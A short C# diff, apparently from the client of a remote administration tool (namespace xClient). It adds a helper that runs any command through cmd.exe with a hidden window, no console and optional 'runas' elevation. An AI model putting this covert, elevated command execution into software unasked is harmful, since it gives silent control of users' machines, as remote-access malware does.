@@ -1,10 +1,22 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Management;
 
 namespace xClient.Core.Helper
 {
     public static class SystemHelper
     {
+        public static Process ExecuteCommandLine(string cmd, bool asAdmin)
+        {
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\cmd.exe";
+            psi.Arguments = "/c " + cmd;
+            psi.Verb = asAdmin ? "runas" : "";
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
+            psi.CreateNoWindow = true;
+
+            return Process.Start(psi);
+        }
         public static string GetUptime()
         {
             try
